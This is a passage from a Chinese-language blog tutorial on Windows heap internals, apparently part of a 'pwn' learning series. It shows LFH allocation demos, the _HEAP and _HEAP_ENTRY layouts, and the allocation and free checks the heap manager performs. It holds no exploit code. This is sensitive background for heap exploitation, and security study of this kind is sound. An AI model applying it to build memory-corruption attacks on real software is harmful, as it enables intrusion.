chunk[14] address is: 000002C55E501660</span><br><span class="line">[+] chunk[15] address is: 000002C55E501760</span><br><span class="line">[+] chunk[16] address is: 000002C55E501860</span><br><span class="line">[+] chunk[17] address is: 000002C55E500750</span><br><span class="line">[+] chunk[18] address is: 000002C55E504D70</span><br><span class="line">[+] chunk[19] address is: 000002C55E505970</span><br><span class="line">[+] chunk[20] address is: 000002C55E504570</span><br><span class="line">[+] chunk[21] address is: 000002C55E505870</span><br><span class="line">[+] chunk[22] address is: 000002C55E504A70</span><br><span class="line">[+] chunk[23] address is: 000002C55E504970</span><br><span class="line">[+] chunk[24] address is: 000002C55E505070</span><br><span class="line">[+] chunk[25] address is: 000002C55E504470</span><br><span class="line">[+] chunk[26] address is: 000002C55E504270</span><br><span class="line">[+] chunk[27] address is: 000002C55E505C70</span><br><span class="line">[+] chunk[28] address is: 000002C55E505570</span><br><span class="line">[+] chunk[29] address is: 000002C55E505270</span><br></pre></td></tr></table></figure><p>可以看到前17个堆块的地址间隔固定，后面的chunk地址开始变得随机，是由Front-End分配的。</p><p>但当使用 <code>HeapAlloc(hHeap, 1, 0xF0);</code>时chunk地址的间隔固定了，原因是 <code>HEAP_NO_SERIALIZE</code>告诉堆管理器<strong>不要</strong>在这次分配时对堆加锁，表明了目前系统是单线程环境，LFH 这种专门用来解决“多线程抢锁问题”的复杂机制就失去了存在的意义。为了节省资源和降低复杂度，Windows 就会直接关闭 LFH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span>* ptr[<span class="number">30</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">   <span class="comment">// HANDLE hHeap = HeapCreate(0, 0x10000, 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] chunk[%02d] address is: %p\n&quot;</span>, i, ptr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果将HeapAlloc改成malloc的话，堆地址呈现非常混乱，原因是malloc它通常底层调用 <code>HeapAlloc(GetProcessHeap(), ...)</code>。<strong>进程默认堆是非常“脏”的</strong> 。在你进入 <code>main</code> 函数之前，系统初始化、加载 DLL、CRT 初始化都已经在这个堆上进行了成千上万次分配和释放。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[+] chunk[00] address is: 0000021637658B90</span><br><span class="line">[+] chunk[01] address is: 0000021637662860</span><br><span class="line">[+] chunk[02] address is: 0000021637662960</span><br><span class="line">[+] chunk[03] address is: 0000021637662A60</span><br><span class="line">[+] chunk[04] address is: 0000021637662FD0</span><br><span class="line">[+] chunk[05] address is: 00000216376630D0</span><br><span class="line">[+] chunk[06] address is: 00000216376631D0</span><br><span class="line">[+] chunk[07] address is: 00000216376632D0</span><br><span class="line">[+] chunk[08] address is: 00000216376633D0</span><br><span class="line">[+] chunk[09] address is: 00000216376634D0</span><br><span class="line">[+] chunk[10] address is: 00000216376635D0</span><br><span class="line">[+] chunk[11] address is: 00000216376636D0</span><br><span class="line">[+] chunk[12] address is: 00000216376637D0</span><br><span class="line">[+] chunk[13] address is: 0000021637663D20</span><br><span class="line">[+] chunk[14] address is: 0000021637663B20</span><br><span class="line">[+] chunk[15] address is: 0000021637664A20</span><br><span class="line">[+] chunk[16] address is: 0000021637665420</span><br><span class="line">[+] chunk[17] address is: 0000021637665220</span><br><span class="line">[+] chunk[18] address is: 0000021637664D20</span><br><span class="line">[+] chunk[19] address is: 0000021637664920</span><br><span class="line">[+] chunk[20] address is: 0000021637665520</span><br><span class="line">[+] chunk[21] address is: 0000021637665620</span><br><span class="line">[+] chunk[22] address is: 0000021637665320</span><br><span class="line">[+] chunk[23] address is: 0000021637665720</span><br><span class="line">[+] chunk[24] address is: 0000021637663920</span><br><span class="line">[+] chunk[25] address is: 0000021637664720</span><br><span class="line">[+] chunk[26] address is: 0000021637664820</span><br><span class="line">[+] chunk[27] address is: 0000021637663C20</span><br><span class="line">[+] chunk[28] address is: 0000021637663A20</span><br><span class="line">[+] chunk[29] address is: 0000021637664B20</span><br></pre></td></tr></table></figure><h3 id="后端堆"><a href="#后端堆" class="headerlink" title="后端堆"></a>后端堆</h3><h4 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x2c0 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_SEGMENT</span> <span class="title">Segment</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Entry</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">            ULONG SegmentSignature;                                         <span class="comment">//0x10</span></span><br><span class="line">            ULONG SegmentFlags;                                             <span class="comment">//0x14</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentListEntry</span>;</span>                            <span class="comment">//0x18</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span>* <span class="title">Heap</span>;</span>                                             <span class="comment">//0x28</span></span><br><span class="line">            VOID* BaseAddress;                                              <span class="comment">//0x30</span></span><br><span class="line">            ULONG NumberOfPages;                                            <span class="comment">//0x38</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">FirstEntry</span>;</span>                                 <span class="comment">//0x40</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">LastValidEntry</span>;</span>                             <span class="comment">//0x48</span></span><br><span class="line">            ULONG NumberOfUnCommittedPages;                                 <span class="comment">//0x50</span></span><br><span class="line">            ULONG NumberOfUnCommittedRanges;                                <span class="comment">//0x54</span></span><br><span class="line">            USHORT SegmentAllocatorBackTraceIndex;                          <span class="comment">//0x58</span></span><br><span class="line">            USHORT Reserved;                                                <span class="comment">//0x5a</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRSegmentList</span>;</span>                              <span class="comment">//0x60</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x70</span></span><br><span class="line">    ULONG ForceFlags;                                                       <span class="comment">//0x74</span></span><br><span class="line">    ULONG CompatibilityFlags;                                               <span class="comment">//0x78</span></span><br><span class="line">    ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br><span class="line">    ULONG Interceptor;                                                      <span class="comment">//0x90</span></span><br><span class="line">    ULONG VirtualMemoryThreshold;                                           <span class="comment">//0x94</span></span><br><span class="line">    ULONG Signature;                                                        <span class="comment">//0x98</span></span><br><span class="line">    ULONGLONG SegmentReserve;                                               <span class="comment">//0xa0</span></span><br><span class="line">    ULONGLONG SegmentCommit;                                                <span class="comment">//0xa8</span></span><br><span class="line">    ULONGLONG DeCommitFreeBlockThreshold;                                   <span class="comment">//0xb0</span></span><br><span class="line">    ULONGLONG DeCommitTotalFreeThreshold;                                   <span class="comment">//0xb8</span></span><br><span class="line">    ULONGLONG TotalFreeSize;                                                <span class="comment">//0xc0</span></span><br><span class="line">    ULONGLONG MaximumAllocationSize;                                        <span class="comment">//0xc8</span></span><br><span class="line">    USHORT ProcessHeapsListIndex;                                           <span class="comment">//0xd0</span></span><br><span class="line">    USHORT HeaderValidateLength;                                            <span class="comment">//0xd2</span></span><br><span class="line">    VOID* HeaderValidateCopy;                                               <span class="comment">//0xd8</span></span><br><span class="line">    USHORT NextAvailableTagIndex;                                           <span class="comment">//0xe0</span></span><br><span class="line">    USHORT MaximumTagIndex;                                                 <span class="comment">//0xe2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TAG_ENTRY</span>* <span class="title">TagEntries</span>;</span>                                     <span class="comment">//0xe8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRList</span>;</span>                                             <span class="comment">//0xf0</span></span><br><span class="line">    ULONGLONG AlignRound;                                                   <span class="comment">//0x100</span></span><br><span class="line">    ULONGLONG AlignMask;                                                    <span class="comment">//0x108</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">VirtualAllocdBlocks</span>;</span>                                 <span class="comment">//0x110</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentList</span>;</span>                                         <span class="comment">//0x120</span></span><br><span class="line">    USHORT AllocatorBackTraceIndex;                                         <span class="comment">//0x130</span></span><br><span class="line">    ULONG NonDedicatedListLength;                                           <span class="comment">//0x134</span></span><br><span class="line">    VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line">    VOID* UCRIndex;                                                         <span class="comment">//0x140</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_PSEUDO_TAG_ENTRY</span>* <span class="title">PseudoTagEntries</span>;</span>                        <span class="comment">//0x148</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LOCK</span>* <span class="title">LockVariable</span>;</span>                                        <span class="comment">//0x160</span></span><br><span class="line">    LONG (*CommitRoutine)(VOID* arg1, VOID** arg2, ULONGLONG* arg3);        <span class="comment">//0x168</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">RTL_RUN_ONCE</span> <span class="title">StackTraceInitVar</span>;</span>                                  <span class="comment">//0x170</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_HEAP_MEMORY_LIMIT_DATA</span> <span class="title">CommitLimitData</span>;</span>                     <span class="comment">//0x178</span></span><br><span class="line">    VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">    USHORT FrontHeapLockCount;                                              <span class="comment">//0x1a0</span></span><br><span class="line">    UCHAR FrontEndHeapType;                                                 <span class="comment">//0x1a2</span></span><br><span class="line">    UCHAR RequestedFrontEndHeapType;                                        <span class="comment">//0x1a3</span></span><br><span class="line">    WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br><span class="line">    USHORT FrontEndHeapMaximumIndex;                                        <span class="comment">//0x1b0</span></span><br><span class="line">    <span class="keyword">volatile</span> UCHAR FrontEndHeapStatusBitmap[<span class="number">129</span>];                           <span class="comment">//0x1b2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_COUNTERS</span> <span class="title">Counters</span>;</span>                                         <span class="comment">//0x238</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TUNING_PARAMETERS</span> <span class="title">TuningParameters</span>;</span>                        <span class="comment">//0x2b0</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>_HEAP</code> 是堆管理的最核心结构，和 linux glibc 的 <code>main_arena</code> 作用类似。每一个 HEAP 都有一个 <code>_HEAP</code> 结构，存在于该 HEAP 的开头。</p><p>根据下面的图片理解其中的一部分参数</p><ul><li><code>EncodeFlagMask</code>：Heap 初始化后会设置为 0x100000 ，用于判断是否要加密该 heap 空间中每个堆的 chunk_header 。</li><li><code>Encoding</code>（<code>_Heap_Entry</code>）：用于与 chunk_header 做异或的 cookies；所有分配的 chunk 的 chunk_header 都会与 <code>Encoding</code> 进行异或，然后在存入内存中。</li><li><code>VirtualAllocdBlocks</code>：一个双向链表的 dummy head ，存放着 <code>Flink</code> 和 <code>Blink</code> ，将 <code>VirtualAllocate</code> 出来的 chunk 链接起来。</li><li><code>BlocksIndex</code>（<code>_Heap_LIST_LOOKUP</code>）：Back-End 中用于管理后端管理器中的 chunk 。</li><li><code>FreeList</code>（<code>_Heap_Entry</code>）：连接 Back-End 中的所有 free chunk ，类似 unsorted bin 。</li><li><code>FrontEndHeap</code>：指向管理 FrontEnd 的 heap 结构。</li><li><code>FrontEndHeapUsageData</code>：指向一个对应各大小 chunk 的数组，记录各种大小 chunk 的使用次数，到达某个程度时会开启该对应大小 chunk 的 Front-End 分配器。<strong>如果开启 LFH 后对应的 <code>FrontEndHeapUsageData</code> 是 <code>SegmentInfoArrays</code> 的下标。</strong></li><li><code>FrontEndHeapStatusBitmap</code>：非常重要。是一个 bitmap 数组，每一项长度为 1 字节，用来记录某个 size 是否开启了 LFH 。判断方式是 <code>_HEAP.FrontEndHeapStatusBitmap[(size &gt;&gt; 4) &gt;&gt; 3] &amp; (1 &lt;&lt; ((size &gt;&gt; 4) &amp; 7))</code> 是否为 1 ，如果是 1 则说明对应 size 开启了 LFH 。</li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759827041548.png" alt="1759827041548"></p><h5 id="HEAP-ENTRY"><a href="#HEAP-ENTRY" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h5><p>最普通的_HEAP_ENTRY结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint2B Size;</span><br><span class="line">    Uchar Flags;</span><br><span class="line">    Uchar SmallTagIndex;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与linux类似, 也是头部 + User Data的形式，</p><p>Allocated chunk图解：</p><ul><li><p><code>PreviousBlockPrivateData</code>：8 字节，可为前一块 chunk 的 data ，因为 chunk 必须对齐。</p></li><li><p><code>Size</code>: chunk 的大小，为实际大小右移 4bit 后的值。比如大小为 0x80 的 chunk 的 <code>Size</code> 值为 0x8 。</p></li><li><p><code>Flags</code>: 表示该chunk的状态：</p><ul><li><code>HEAP_ENTRY_BUSY(01)</code> 堆块处于占用状态</li><li><code>HEAP_ENTRY_EXTRA_PRESENT(02)</code> 该块存在额外的描述 <code>_HEAP_ENTRY_EXTRA</code></li><li><code>HEAP_ENTRY_FILE_PATTERN(03)</code> 使用固定模式填充堆块<ul><li><code>HEAP_ENTRY_VIRTUAL_ALLOC(08)</code> 通过 virtual allocation 虚拟分配的堆块</li></ul></li><li><code>HEAP_ENTRY_LAST_ENTRY(10)</code> 表示是该段的最后一个堆块</li></ul></li><li><p><code>SmallTagIndex</code>: 前 3 个字节异或后的值，用于验证。</p></li><li><p><code>PreviousSize</code>: 前⼀个 chunk 的大小，为实际大小右移 4bit 后的值。</p></li><li><p><code>SegmentOffset</code>: 在某种情况下用来寻找 Heap 的。</p></li><li><p><code>Unusedbytes</code>：整个 chunk 的大小减去用户 malloc 的大小，因为如果 chunk 是在使用状态 <code>Unusedbytes</code> 一定不为 0 ，因此可以判断 chunk 是否空闲（&amp;0x3F 是否为 0）。另外这个值还有一个 0x80 的标志位也可以用来判断 chunk 的状态是前端堆还是后端堆。</p><ul><li>在freed的时候, 恒为0</li></ul></li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759827663746.png" alt="1759827663746"></p><p>chunk_header在内存中是加密的，解密需要和 <code>_HEAP-&gt;Encoding</code>进行异或</p><p>Freed chunk图解：</p><p>多了一个 <code>_LIST_ENTRY</code> 结构</p><ul><li><code>Flags</code> 为 0 表示 freed</li><li><code>UnusedBytes</code> （&amp;0x3f）始终为 0</li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759827677806.png" alt="1759827677806"></p><h5 id="HEAP-LIST-LOOKUP"><a href="#HEAP-LIST-LOOKUP" class="headerlink" title="_HEAP_LIST_LOOKUP"></a>_HEAP_LIST_LOOKUP</h5><p>(BlocksIndex)_HEAP_LIST_LOOKUP用来管理各种不同大小的 freed chunk ，能快速的找到合适的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x38 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span>* <span class="title">ExtendedLookup</span>;</span>                               <span class="comment">//0x0</span></span><br><span class="line">    ULONG ArraySize;                                                        <span class="comment">//0x8</span></span><br><span class="line">    ULONG ExtraItem;                                                        <span class="comment">//0xc</span></span><br><span class="line">    ULONG ItemCount;                                                        <span class="comment">//0x10</span></span><br><span class="line">    ULONG OutOfRangeItems;                                                  <span class="comment">//0x14</span></span><br><span class="line">    ULONG BaseIndex;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">ListHead</span>;</span>                                           <span class="comment">//0x20</span></span><br><span class="line">    ULONG* ListsInUseUlong;                                                 <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>** <span class="title">ListHints</span>;</span>                                         <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><ul><li><code>ExtendedLookup (Ptr64 _HEAP_LIST_LOOKUP)</code>：指向下一个 <code>BlocksIndex</code>，通常下一个 <code>BlocksIndex</code>会管理更大的 chunk 。</li><li><code>ArraySize</code>：该结构会管理最大 chunk 的大小 + 0x10 。上面例子中 <code>ArraySize</code> 为 0x80 但由于右移实际是 0x800 。</li><li><code>ItemCount</code>：4 字节，目前该结构所管理的 chunk 数。</li><li><code>OutofRangeItems</code>：超出该结构所管理大小的 chunk 的数量。</li><li><code>BaseIndex</code>：该结构所管理的 chunk 的起始 index ，将 <code>(Aligned(size) &gt;&gt; 4) - BaseIndex</code> 作为 <code>ListHint</code> 中查找的下标。通常下一个 <code>BlocksIndex</code> 将上一个 <code>BlocksIndex</code> 的 <code>ArraySize</code> 作为 <code>BaseIndex</code> 。</li><li><code>ListHead</code>：指向 <code>_HEAP</code> 的 <code>FreeList</code> 。</li><li><code>ListsInUseUlong</code>：用在判断 <code>ListHint</code> 中是否有适合大小的 chunk ，是一个 bitmap 。</li><li><code>ListHint</code>：十分重要，用来指向对应大小的 chunk array ，其目的就在于更快速找到适合大小的 chunk ，0x10 大小为一个间隔。可以类比linux ptmalloc的tcache bin, 只不过chunk的组织仍然通过双向链表维护</li></ul><h4 id="分配机制-RtlAllocateHeap"><a href="#分配机制-RtlAllocateHeap" class="headerlink" title="分配机制(RtlAllocateHeap)"></a>分配机制(RtlAllocateHeap)</h4><p>根据分配大小主要有三种：</p><ul><li><strong>case1</strong> : <code>size &lt;= 0x4000</code></li><li><strong>case2</strong> : <code>0x4000 &lt; size &lt;= 0xff000</code></li><li><strong>case3</strong> : <code>size &gt; 0xff000</code></li></ul><p>case1：</p><p>还是需要这个图进行理解</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759831326041.png" alt="1759831326041"></p><ul><li>检查是否有该 <code>Size</code> 对应的 <code>FrontEndHeapStatusBitmap</code>，判断是否启动了LFH</li><li>遍历 <code>BlocksIndex</code> 链表，找到第一个 <code>ArraySize</code> 大于 <code>Size</code> 的 <code>BlocksIndex</code> ，然后找到对应的 <code>ListHint</code> ，即 <code>BlocksIndex-&gt;ListHints[Size - BlocksIndex-&gt;BaseIndex]</code> 。调用 <code>RtlpAllocateHeap</code> 函数分配内存。</li><li>查看对应的 <code>ListHint</code> 中是否有值（也就是ListHint数组里否有对应 size 的 freed chunk）：<ul><li><p>如果刚好有值，就检查该 chunk 的 <code>Flink</code> （下一个freed chunk）是否是同样 size 的 chunk ：</p><ul><li>若是则将 <code>Flink</code> 写到对应的 <code>ListHint</code> 中。</li><li>若否则清空对应 <code>ListHint</code> 。</li></ul><p>最后将该 chunk 从 <code>Freelist</code> 中 unlink 出来（同时header也会恢复正常）。</p></li><li><p>如果对应的 <code>ListHint</code> 中本身就没有值，就从比较大的 <code>ListHint</code> 中找：</p><ul><li>如果找到了，就以上述同样的方式处理该 <code>ListHint</code> ，并 unlink 该 chunk ，之后对其进行切割，剩下的重新放入 <code>FreeList</code> ，如果可以放进 <code>ListHint</code> 就会放进去，再 encode header 。</li><li>如果没较大的 <code>ListHint</code> 也都是空的，那么尝试 <code>ExtendedHeap</code> 加大堆空间，再从 extend 出来的 chunk 拿，接着一样切割，放回 <code>ListHIint</code> ，encode header 。</li></ul></li></ul></li></ul><p>case2：没有LFH检查，其他和case1一样</p><p>case3：直接调用 <code>ZwAllocateVirtualMemroy</code> 进行分配，类似于 linux 下的 <code>mmap</code> 直接给一大块地址，并且插入 <code>_HEAP-&gt;VirtualAllocdBlocks</code> 中。</p><h4 id="Free-RtlFreeHeap"><a href="#Free-RtlFreeHeap" class="headerlink" title="Free (RtlFreeHeap)"></a>Free (RtlFreeHeap)</h4><ul><li>调用 <code>RtlpValidateHeapEntry</code> 对要释放的 chunk 进行一系列的检查：<ul><li>释放的 <code>_HEAP_ENTRY</code> 是否为 NULL</li><li>释放的 <code>_HEAP_ENTRY</code> 地址是否关于 0x10 对齐</li><li>通过 <code>UnusedBytes &amp; 0x3F</code> 是否为 0 判断 <code>_HEAP_ENTRY</code> 是否已被释放过，相当于判断Double Free</li><li>检查校验位 <code>SmallTagIndex</code> （先当于checksum）</li><li>如果 <code>UnusedBytes</code> 为 4 即通过 <code>ZwAllocateVirtualMemroy</code> 分配的内存，则判断整个 <code>_HEAP_VIRTUAL_ALLOC_ENTRY</code> 是否关于 0x1000 对齐</li><li>如果 <code>UnusedBytes</code> 不为 4 则通过 <code>SegmentOffset</code> 找到 <code>_HEAP</code> 然后判断 <code>_HEAP_ENTRY</code> 是否在 <code>[Heap-&gt;Segment.FirstEntry, Heap-&gt;Segment.LastValidEntry)</code> 范围内</li></ul></li><li>调用 <code>RtlFreeHeap</code> ，进而调用 <code>RtlpFreeHeapInternal</code> ，通过 <code>Heap-&gt;Segment.SegmentSignature</code> 判断是否为 Segment Heap ，如果是则单独处理，否则继续执行。</li><li>判断地址是否关于 0x10 对齐以及通过 <code>UnusedBytes &amp; 0x3F</code> 是否为 0 判断 <code>_HEAP_ENTRY</code> 是否已被释放过。（重复？）</li><li>根据 <code>UnusedBytes</code> 是否小于 0 （0x80 是否置位）判断是否是 LFH 堆，如果不是则调用后端堆释放的核心函数 <code>RtlpFreeHeap</code> 。</li><li>解密 <code>_HEAP_ENTRY</code> 并校验 <code>SmallTagIndex</code> ，根据 chunk 大小找到对应的 <code>BlocksIndex</code> 。</li><li>根据 <code>UnusedBytes</code> 是否为 4 判断是否是通过 <code>ZwAllocateVirtualMemroy</code> 分配的内存。如果是则检查该 chunk 的 <code>_HEAP_ENTRY-&gt;Flink-&gt;Blink == _HEAP_ENTRY-&gt;Blink-&gt;Flink == &amp;_HEAP_ENTRY</code> 并从 <code>_HEAP-&gt;VirtualAllocdBlocks</code> 中移除，接着使用 <code>RtlpSecMemFreeVirtualMemory</code> 将 chunk 整个 munmap 掉。（类似于unlink检查）</li><li>如果 chunk 大小在 LFH 堆的范围内（<code>_HEAP_ENTRY-&gt;Size &lt; _HEAP-&gt;FrontEndHeapMaximumIndex</code>），会将对应的 <code>FrontEndHeapUsageData -= 1</code>（并不是0x21）。</li><li>接着判断前后的 chunk 是否是 freed 的状态（根据 <code>_HEAP_ENTRY.Flags</code> 的 1 是否置位判断），如果是的话就检查前后的 freed chunk （校验 <code>SmallTagIndex</code> 以及 <code>_HEAP_ENTRY-&gt;Flink-&gt;Blink == _HEAP_ENTRY-&gt;Blink-&gt;Flink == &amp;_HEAP_ENTRY</code>）然后将前后的 freed chunk 从 <code>FreeList</code> 中 unlink 下来（与上面的方式一样更新 <code>ListHint</code>），再进行合并。</li><li>合并完之后更新 <code>Size</code> 和 <code>PreviousSize</code> ，判断一下 <code>Size</code> 较大的情况，然后把合并好的 chunk 插入到 <code>ListHint</code> 中；插入时也会对 <code>FreeList</code> 进行检查（但是此检查不会触发 abort ，原因在于没有做 unlink 写入）。</li></ul><h3 id="LFH堆"><a href="#LFH堆" class="headerlink" title="LFH堆"></a>LFH堆</h3><p>当同一个大小的堆块分配次数过多的时候，除了从后端堆分配所需堆块外，还会额外分配一块很大的内存供前端堆使用，之后再次分配该大小的堆块的时候会从前端堆分配。</p><h4 id="相关结构体-1"><a href="#相关结构体-1" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="FrontEndHeap（-LFH-HEAP）"><a 